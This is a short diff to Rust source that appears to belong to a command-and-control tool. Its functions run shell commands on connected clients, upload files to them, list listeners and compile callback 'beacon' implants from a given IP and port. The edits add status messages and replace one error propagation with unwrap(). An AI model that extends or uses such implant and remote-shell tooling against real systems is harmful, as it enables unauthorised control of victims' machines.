@@ -207,6 +207,7 @@ async fn shell_commands(
             {
                 return Err(());
             }
+            println!("[+] Scanning potential targets...");
             match client.read().await {
                 Ok(incoming) => {
                     println!("{}", String::from_utf8(incoming).unwrap());
@@ -361,6 +362,9 @@ async fn upload_file(client: &mut Client, filename: &String, data: Vec<u8>) -> R
 
 pub async fn list_listeners(clients: &ClientList) {
     let listeners = clients.listeners.lock().await;
+    if listeners.is_empty() {
+        println!("No active listeners yet");
+    }
     for listener in listeners.iter() {
         println!("{}", listener);
     }
@@ -389,15 +393,13 @@ fn is_valid_file_path(path: &str) -> bool {
 pub async fn generate_beacon(_args: &[String]) -> Result<Beacon, String> {
     let file_path = get_file_path().await?;
     let (ip, port) = get_beacon_details().await?;
-
-    let temp_dir = TempDir::new().map_err(|e| e.to_string())?;
+    let temp_dir = TempDir::new().unwrap();
     let project_dir = temp_dir.path().to_owned();
     let crate_name = "client";
-
     println!("[*] Temporary project directory: {:?}", project_dir);
-
+    
     create_project_files(&project_dir, &ip, &port).await?;
-
+    
     compile_beacon(&project_dir, crate_name).await?;
 
     let dist_path = copy_executable(&project_dir, &file_path).await?;
